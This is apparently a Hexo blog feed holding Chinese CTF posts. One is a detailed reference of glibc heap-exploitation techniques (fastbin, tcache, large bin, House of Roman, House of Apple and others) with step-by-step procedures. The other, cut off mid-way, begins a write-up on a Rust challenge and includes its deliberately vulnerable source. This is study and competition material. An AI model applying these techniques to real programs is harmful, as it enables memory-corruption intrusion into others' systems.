<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-13T08:05:13.635Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>How2Heap总集篇导演剪辑剧场版</title>
    <link href="http://example.com/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/"/>
    <id>http://example.com/2024/12/13/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/</id>
    <published>2024-12-13T04:00:00.000Z</published>
    <updated>2024-12-13T08:05:13.635Z</updated>
    
    <content type="html"><![CDATA[<p>摆了，可以参考<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a></p><h1>Basic：</h1><h2 id="UAF">UAF</h2><p>free后指针不置空可以再次使用。</p><h2 id="Overflow">Overflow</h2><p>溢出，这个一般用于篡改size或prevsize域比较多，能溢出fd和bk也行。</p><h2 id="Off-By-One">Off By One</h2><p>只能溢出1字节。可以篡改下一个chunk的PREV_INUSE位造成合并等。</p><h2 id="Double-Free">Double Free</h2><p>多次释放同一堆块。接着通过分配可以获得指向同一堆块的多个不同指针。可以类型混淆，也可以获取UAF。</p><ul class="lvl-0"><li class="lvl-2"><p>对于fastbin chunk，PREV_INUSE永远为1，因此double free会有奇效。同时只检查第一块是否double free。</p></li></ul><h2 id="Overlap">Overlap</h2><p>重叠。本质上也是借助上面几个漏洞修改size（向前重叠）或者prevsize（向后重叠）域然后释放。这样就有一个chunk内部的一个额外指针了。<a href="https://zjw1nd.github.io/2023/12/03/How2Heap-2/">（未必）更加细节的介绍</a><br>house of Rabbit也是差不多</p><h2 id="Leak">Leak</h2><h3 id="Unsorted-Bin-Leak">Unsorted Bin Leak</h3><p>unsortedbin中的头部chunk的fd会指向main_arena+88的位置。只有一个chunk的话fd和bk都会指向其中。</p><h3 id="tcache-leak">tcache leak</h3><p>用tcache可以泄露堆的起始地址。</p><h3 id="其他">其他</h3><p>类似的放入bin中然后打出内容的思想都可以。</p><h2 id="hook">hook</h2><p>在2.34之前hook没有移除的情况下我们一直可以通过修改mallochook，freehook，reallochook等函数来劫持控制流。一般来说是将chunk分配到这里然后改成one_gadget。比如<a href="#House_of_Roman">House_of_Roman</a>中针对2.23的<code>malloc_hook-0x23</code>地方的fastbinchunk等等</p><p>然而实际利用中很多时候我们会发现所有的one_gadget都不满足的情况，这种时候该怎么办？下面是一些思路</p><ol><li class="lvl-3"><p>利用realloc_hook。观察<code>__libc_realloc</code>的代码可以发现，前面push了很多参数：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000846</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000846</span>C0                 push    r15             ; Alternative name is <span class="string">&#x27;__libc_realloc&#x27;</span></span><br><span class="line">.text:<span class="number">00000000000846</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000000846</span>C4                 push    r13</span><br><span class="line">.text:<span class="number">00000000000846</span>C6                 push    r12</span><br><span class="line">.text:<span class="number">00000000000846</span>C8                 mov     r13, rsi</span><br><span class="line">.text:<span class="number">00000000000846</span>CB                 push    rbp</span><br><span class="line">.text:<span class="number">00000000000846</span>CC                 push    rbx</span><br><span class="line">.text:<span class="number">00000000000846</span>CD                 mov     rbx, rdi</span><br><span class="line">.text:<span class="number">00000000000846</span>D0                 sub     rsp, <span class="number">38</span>h</span><br><span class="line">.text:<span class="number">00000000000846</span>D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">00000000000846</span>DB                 mov     rax, [rax]</span><br><span class="line">                 test    rax, rax</span><br><span class="line">                 jnz     loc_848E8 ;这里call rax</span><br></pre></td></tr></table></figure><p>realloc调整栈帧og触发，或者利用其他环境触发malloc包括doublefree异常–strdup</p><h2 id="一些常识：">一些常识：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>tcache最多64个，每个最大连接7个chunk。下标就是按malloc_align分，以64位为例，0-24大小的对应idx0，25-40对应idx1，41-56对应idx2依次类推每个+16。然后32位就是0-12，13-20这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_MXFAST             <span class="number">64</span> (<span class="keyword">for</span> <span class="number">32b</span>it), <span class="number">128</span> (<span class="keyword">for</span> <span class="number">64b</span>it)</span><br></pre></td></tr></table></figure><h1>Glibc 2.23</h1><blockquote><p>无tcache，检查较少，很经典</p></blockquote><h2 id="arena-attack（House-of-Mind-House-of-Gods）">arena attack（House of Mind &amp; House of Gods）</h2><p>实战利用价值小，看个乐</p><h3 id="House-of-mind">House of mind</h3><p>伪造arena，blog没写，是一种通过伪造arena从而将释放的chunk连入假arena的过程，利用比较抽象而且最后似乎还没有任意写。</p><h3 id="House-of-Gods">House of Gods</h3><p>利用arena结构体中的数据和错位实现在main_arena中构建一个chunk进行写入，然后篡改arena的next指针将堆变成我们自己的arena来劫持整个堆。具体参见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a>，虽然非常复杂没什么用但是可以看看这个堆风水的过程，非常的神必，有助于理解main_arena的结构：</p><ol><li class="lvl-3"><p>泄露unsorted bin 头的地址，malloc一个smallchunk然后直接读。通过free+malloc(intm)启动遍历过程，将位图置位。这个时候我们让bin[0]作为伪造的size域存在。此时它是0x200.</p></li><li class="lvl-3"><p>首先将smallchunk放回unsortedbin中。用上面的leak在main_arena内寻址。利用UAF修改smallchunk的bk，在unsortedbin里面链接上这个伪造chunk。</p></li><li class="lvl-3"><p>利用malloc_state的特性，修改fastbin chunk的bk字段然后将其释放，控制其在malloc_state的开头，接着作为一个伪造的bk字段存在，链接到INTM。巧妙至极。</p><blockquote><p>这时候的unsorted bin：head-&gt;smallchunk-&gt;binmap[last]（伪造的）-&gt;main_arena的开头（由于next指针开始就是指向本身的）-&gt;fast40-&gt;INTM</p></blockquote></li><li class="lvl-3"><p>将binmap chunk作为一个“chunk”取出。得到了写入main_arena（即便是部分）的权限！开始为触发<code>reused_arena()</code>的条件铺路。</p></li><li class="lvl-3"><p>接着UAF改INTM的bk，让INTM后面再连接上narenas字段。然后取出INTM触发unsortedbin attack，将narenas写为一个大数。同时用binmap chunk，改掉system_mem字段。</p></li><li class="lvl-3"><p>用binmap chunk将arena的next指针随便写成你想分配的地址</p></li><li class="lvl-3"><p>连续调用两次<code>malloc(0xffffffffffffffbf + 1)</code>，arena直接全部hijack掉。</p></li><li class="lvl-3"><p>随便操。</p></li></ol><h2 id="Top-chunk-related-attack（House-of-Force-House-of-Orange）">Top chunk related attack（House of Force &amp; House of Orange）</h2><p>利用topchunk的一些特性达成我们的目的。House of Force可以实现任意地址分配，House of Orange可以实现不调用free情况下的一次释放。</p><h3 id="House-of-Force">House of Force</h3><p>见<a href="https://zjw1nd.github.io/2023/12/17/How2Heap-3/">How2Heap3</a><br>将top chunk的size域改到极大，然后通过分配evil_size的chunk将topchunk推进到我们想分配的地址，随后下次分配就会从top中切出我们指定地址的chunk。</p><ul class="lvl-0"><li class="lvl-2"><p>其中top的size一般写成-1，evil_size的计算如下</p></li></ul><blockquote><p>new_top = old_top + nb<br>nb = new_top - old_top<br>req + 2sizeof(long) = new_top - old_top<br>req = new_top - old_top - 2sizeof(long)<br>req = dest - 2sizeof(long) - old_top - 2sizeof(long)<br>req = dest - old_top - 4*sizeof(long)</p></blockquote><h3 id="House-of-Orange">House of Orange</h3><p>见<a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">How2Heap4</a><br>神中神，适用于没有free的情况。通过先改小top chunk的size域然后申请一个较大的chunk来触发sysmalloc中的brk扩展，就会将旧的top放进unsortedbin中。</p><ul class="lvl-0"><li class="lvl-2"><p>top的size需要页对齐，动调确定，一般改为0xfe1然后申请0x1000刚好。</p></li><li class="lvl-2"><p>新申请的会放在新的内存页。</p></li><li class="lvl-2"><p>【glibc 2.23】借助unsorted bin attack改写IO_LIST_ALL为unsorted(av)后将old top放入smallbins[4](改写size为0x61)从而实现用伪造chunk链接至IO_list_all触发fsop。</p></li></ul><h2 id="Fastbin（normal-house-of-spirit-House-of-Rabbit）">Fastbin（normal, house of spirit, House of Rabbit）</h2><p><a href="https://zjw1nd.github.io/2023/11/09/How2Heap-1/">（未必）更加细节的介绍</a></p><h3 id="Normal-fast-bin-attack：">Normal fast bin attack：</h3><p>将一个fastbin分配在我们想要的位置。通过劫持已在fastbin中的一个chunk的fd指针来做到这一点。</p><ul class="lvl-0"><li class="lvl-2"><p>会检查size域，需要提前伪装。</p></li><li class="lvl-2"><p>分配在malloc_hook或free_hook的话经常配合0x7f的字节错位来伪造size域</p></li><li class="lvl-2"><p>UAF和Double free，fastbin在2.23中只检查头部是否double free从而我们可以用dup来实现Write after free</p></li></ul><h3 id="House-of-Spirit">House of Spirit</h3><p>伪造fastbin的chunk。通过free放入bin。需要注意：</p><ul class="lvl-0"><li class="lvl-2"><p>边界0x10对齐</p></li><li class="lvl-2"><p>size域大小合适，满足fastbin要求</p></li><li class="lvl-2"><p>next的地址不能是top，而且size要正常（不用必须是fastbin）</p></li></ul><h3 id="House-of-Rabbit">House of Rabbit</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>针对consolidate不严格检查size的fastbin attack. 要能修改size域并且有触发consolidate的条件</p><ul class="lvl-0"><li class="lvl-2"><p>修改size，然后触发consolidate变成overlap。</p></li><li class="lvl-2"><p>修改fd然后触发consolidate将fake_chunk放入bin中变成合法chunk（注意伪造size）</p></li></ul><h2 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>利用Unsorted Bin取出chunk时候的这个特性（双向链表，bk遍历）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>控制住unsorted bin中的下一个会取出的chunk的bk域，我们就能将一个大数（<code>unsorted_chunks(av)</code>）写入我们想要的地址，由于是fd偏移，所以将chunk中的bk写成targetaddr-16即可。可以用于篡改循环次数或<code>GLOBAL_MAX_FAST</code>等。</p><h2 id="House-of-Lore（Small-bin-attack）">House of Lore（Small bin attack）</h2><p><a href="https://zjw1nd.github.io/2024/01/25/How2Heap-5/">参考</a><br>smallbin attack。一个UAF改一下smallchunk的fd就是任意地址fakechunk分配。只要能绕过smallbin分配唯一的检查就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Large-Bin-Attack">Large Bin Attack</h2><p><a href="https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">参考</a><br>利用large bin的指针将指定地址的内容写成一个合法的large chunk的地址。将已经在largebin中的chunk的bk或bk_nextsize篡改为target-16、-32即可实现在下一次victim放入largebin时触发将victim写入target的效果。</p><ul class="lvl-0"><li class="lvl-2"><p>从 unsorted bin 中来的 large chunk 要紧跟在攻击过的large chunk后面，也就是要连在一个bin里，大小也要相邻。</p></li><li class="lvl-2"><p>可以篡改io_list_all进行fsop</p></li><li class="lvl-2"><p>可以帮助tcache smash unlink？</p></li></ul><h2 id="COMBO-FISTS-（House-of-Roman-House-of-Storm）">COMBO FISTS （House of Roman, House of Storm）</h2><p><span id="House_of_Roman"></span></p><h3 id="House-of-Roman（组合拳，getshell思路很常用而且允许爆破-Fastbin-atk-Unsorted-bin-atk）">House of Roman（组合拳，getshell思路很常用而且允许爆破, Fastbin atk + Unsorted bin atk）</h3><p><a href="https://zjw1nd.github.io/2024/04/17/How2Heap-6/">参考</a><br>通过分配一个malloc_hook附近的chunk（确切的说是在<code>malloc_hook-0x23</code>处获取一个fastbinchunk）写入one_gadget。<br>这个思路是非常好的，只要是2.23并且任意地址分配chunk就可以用来getshell。有libc地址最好，没有也没关系借助unsorted bin attack+爆破来实现。<br>原poc的流程如下：</p><ul class="lvl-0"><li class="lvl-2"><p>拿一个0x60的fastbin chunk 1（实际大小0x70）</p></li><li class="lvl-2"><p>分配一个不用的chunk，大小0x80，实际大小0x90，此时相对堆基址的偏移来到了0x100，这灵性的一步是为了待会我们改一个字节就能修改指针指向的chunk</p></li><li class="lvl-2"><p>分配一个0x80的chunk 2，等会放入unsorted bin，chunk2的地址此时是0x100对齐的</p></li><li class="lvl-2"><p>分配一个0x60的fastbin chunk 3，该chunk的偏移地址来到了0x190</p></li><li class="lvl-2"><p>释放chunk2，放入unsorted bin，此时其fd和bk存有main_arena+0x68</p></li><li class="lvl-2"><p>取0x60大小的chunk4（fake_libc_chunk），会从chunk2中进行分割，带有main_arena地址</p></li><li class="lvl-2"><p>读取取出的chunk4，泄露main_arena地址然后计算偏移获取malloc_hook</p></li><li class="lvl-2"><p>释放chunk3，放入fastbin</p></li><li class="lvl-2"><p>释放chunk1，接入fastbin链表头，其fd指向chunk3（0x190）</p></li><li class="lvl-2"><p>模拟一个UAF，写chunk1的fd一字节0x00将其fd指向0x100的chunk2（chunk 4）</p></li><li class="lvl-2"><p>写chunk4，修改低位地址令其fd指向目标地址</p></li><li class="lvl-2"><p>最后将fastbin中的chunk1和3取出，再次取就取到了malloc_hook-0x23处的chunk</p></li></ul><h3 id="House-of-Storm-unsorted-bin-atk-largebin-atk">House of Storm (unsorted bin atk + largebin atk)</h3><blockquote><p>BLOG没有写懒得补了写在这里，该技术实现任意地址chunk分配<br>2.26-2.28 需要tcache填满，再往后该漏洞不可用这个技术最关键的一步是largebin attack将fake_chunk地址写上一个堆地址，而且非常巧妙的利用了一个字节错位将其作为了size。下面是POC的流程</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>准备一个unsortedbin堆块一个largebin堆块，其中unsortedbin中的堆块要比largebin中的大 （还要防止top合并）</p></li><li class="lvl-2"><p>将unsortedbin的地址进行一下处理，算出一个移位偏移量。</p></li><li class="lvl-2"><p>将unsorted bin的chunk bk写为fake_chunk，将large chunk的bk写成fake_chunk+8</p></li><li class="lvl-2"><p>将large chunk的bk_nextsize写成fake chunk-0x18-shift_amount，shift是我们先前的偏移</p></li><li class="lvl-2"><p>利用一个large_bin attack将unsorted chunk的地址写入一个恰当的位置正好伪造出fakechunk的size</p></li><li class="lvl-2"><p>申请相应大小（堆地址高8位？）即可获得fake_chunk</p></li></ul><h2 id="House-of-Einhejar——off-by-null">House of Einhejar——off by null</h2><p><a href="https://zjw1nd.github.io/2023/12/30/How2Heap-4/">参考</a><br>仅需off by one就能工作。控制住当前chunk的末8字节（prev_size写成evil_size，差值）然后溢出修改掉下一个chunk的PREV_INUSE位。然后通过free下一个chunk触发合并后，下次分配就能从指定地址取chunk了（prev_size错误合并，overlap）。</p><ul class="lvl-0"><li class="lvl-2"><p>由于off by one，最好溢出的下个chunk的size是0x100对齐的，便于改写</p></li><li class="lvl-2"><p>fakechunk的size要和我们修改的prev_size一致</p></li></ul><h2 id="Unsafe-Unlink">Unsafe Unlink</h2><p>利用Unlink实现overlap或指定地址写（确切地说是将target写成&amp;target-0x18）。但是这个POC中利用所需要的前置条件较多…需要同时修改被unlink的chunk的fd和bk以及下一chunk的prevsize和PREV_INUSE位，要求太高了。</p><h1>glibc 2.27</h1><blockquote><p>这个版本首次引入了tcache<br>下面会着重涉及tcache相关的攻击，同时大部分上面的攻击技巧都要和tcache打交道，比如先填满7个。</p></blockquote><h2 id="Fastbin">Fastbin</h2><p>同上，只是每次要先填满对应大小的7个tcache</p><h2 id="tcache">tcache</h2><p><a href="https://zjw1nd.github.io/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/">参考链接</a></p><h3 id="Same-as-fastbin">Same as fastbin</h3><p>和fastbin一样只不过更简单（没有了fastbin szie检查）。包括double free，house of spirit，tcache poison（对应fastbin attack）等。</p><h3 id="tcache-stashing-unlink-attack">tcache stashing unlink attack</h3><p>在有tcache的情况下替代unsorted bin attack实现任意地址写一个libc地址。同时还能构造fake chunk（任意地址chunk分配）。</p><ul class="lvl-0"><li class="lvl-2"><p>tcache空两个，拿到两个small bin和一个small bin的UAF，fake_chunk的bk写入target</p></li><li class="lvl-2"><p>修改后释放的smallbin块的bk为fake_chunk地址，<strong>calloc触发</strong>写入攻击，target被改同时tcache头部会链入fake_chunk</p></li><li class="lvl-2"><p>下次malloc会返回fake_chunk</p></li></ul><h3 id="House-of-botcake">House of botcake</h3><p>double free实现任意堆块分配。</p><ul class="lvl-0"><li class="lvl-2"><p>用0x110的堆块填满tcache，然后再释放两个相邻的0x110堆块（先a后b）放入unsorted bin并导致合并</p></li><li class="lvl-2"><p>取出一个0x110的chunk（从tcache），然后再次释放上一步中的a块，a块此时被放入tcache，这里形成了一个重叠</p></li><li class="lvl-2"><p>分配一个0x130的堆块，这会从unsorted bin中合并好的块切割，而这时候我们取得的这个chunk可以拿来修改tcache头部的a块</p></li><li class="lvl-2"><p>修改fd后malloc两次即可</p></li></ul><h1>glibc 2.34+</h1><h2 id="Glibc-2-31-House-of-Pig">Glibc 2.31 House of Pig</h2><h2 id="House-of-Kiwi">House of Kiwi</h2><h2 id="House-of-Apple">House of Apple</h2><p>一种思想。在glibc 2.34+的版本中已经没有了malloc_hook这种函数让我们一次就能getshell。堆利用的思想更多的集中到了FSOP上。</p><h3 id="v1">v1</h3><h3 id="v2">v2</h3><p>参考<a href="https://zjw1nd.github.io/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%BC%BA%E7%BD%91%E6%9D%AF2024babyheap/">How2Heap实战——强网杯2024babyheap</a>的板子用一次largebin attack将io_list_all劫持，然后将vtable换成wide版本来让内核从wvtable找函数调用从而规避检查，*（wdata+0xe0）+0x68就是能劫持控制流的地方。</p><p>值得注意的是，在我们劫持的时候，rdi中存放的是fp的地址（也就是我们劫持到的堆地址，借助一些gadget以及setcontext这种我们能够控制几乎所有的寄存器，只要堆上布局合理。<br>在setcontext最后会将[rdx+0xa8]的内容push到栈上然后ret，这也是我们ROP链路的开始。</p><h3 id="v3">v3</h3><h2 id="House-of-Banana">House of Banana</h2><p>攻击_rtld_global的一种方法。劫持rtld_global到可写堆块后通过伪造程序基地址或者finiarray的办法，让程序在调用exit()退出的时候执行我们想要执行的函数。<br>rtld_global的第一字段是linkmap结构体的地址，无论是伪造linkmap还是篡改本来的，再或者改掉程序基地址，我们最终是要让</p><h2 id="House-of-Emma">House of Emma</h2><h2 id="tlor-list">tlor_list</h2><h2 id="Libc-GOT">Libc_GOT</h2><h2 id="io-obstack">io_obstack</h2><h2 id="House-of-Cat">House of Cat</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;摆了，可以参考&lt;a href=&quot;https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31&quot;&gt;https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31&lt;/a&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>How2Heap-rust——qwb2024_chat-with-me</title>
    <link href="http://example.com/2024/12/12/rust-pwn-qwb2024-chat-with-me/"/>
    <id>http://example.com/2024/12/12/rust-pwn-qwb2024-chat-with-me/</id>
    <published>2024-12-12T08:14:22.000Z</published>
    <updated>2024-12-13T07:52:08.087Z</updated>
    
    <content type="html"><![CDATA[<h1>题目分析</h1><p>到手之后是一个扣了符号的rust程序，非常的恶心。</p><h1>最后看看出题人的分享</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-284240.htm">https://bbs.kanxue.com/thread-284240.htm</a></p></blockquote><h2 id="源码：">源码：</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Read, Write&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> MAX_MSG_LEN: <span class="type">usize</span> = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    data: [<span class="type">u8</span>; MAX_MSG_LEN],</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Msg &#123;</span><br><span class="line">            data: [<span class="number">0</span>; MAX_MSG_LEN],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Msg</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;:?&#125;&quot;</span>, <span class="keyword">self</span>.data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#[inline(never)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>(msg: <span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; &gt; &quot;</span>, msg);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    msg_list: <span class="type">Vec</span>&lt;&amp;<span class="symbol">&#x27;static</span> <span class="keyword">mut</span> Msg&gt;,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ChatBox</span> &#123;</span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ChatBox &#123;</span><br><span class="line">            msg_list: <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">add_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Adding a new message&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">push</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">get_ptr</span>());</span><br><span class="line">        <span class="built_in">println!</span>(</span><br><span class="line">            <span class="string">&quot;Successfully added a new message with index: &#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="keyword">self</span>.msg_list.<span class="title function_ invoke__">len</span>() - <span class="number">1</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">show_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Content: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.msg_list[index]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#[inline(never)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">edit_msg</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>(<span class="string">&quot;Index&quot;</span>.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ 